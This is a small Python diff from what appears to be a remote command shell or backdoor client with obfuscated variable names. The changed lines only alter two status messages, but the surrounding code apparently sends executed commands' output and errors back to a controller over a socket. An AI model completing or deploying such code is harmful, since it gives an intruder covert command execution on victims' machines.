@@ -18,11 +18,11 @@ try:
         print(f"output error: {gsysi4gy4}")
         print(f"command: {gsf5ugh5us3}")
         if len(sfgshkgs43) < 4:
-            print("[-] The sfgshkgs43 is none.")
+            print("[-] The output is none.")
             v43h34iu5.send(bytes("Null", "utf-8"))
             v43h34iu5.send(gsysi4gy4)
         else:
-            print("[+] gsf5ugh5us3 succesfully works WITH sfgshkgs43.")
+            print("[+] command succesfully works WITH OUTPUT.")
             v43h34iu5.send(sfgshkgs43)
             v43h34iu5.send(gsysi4gy4)
 
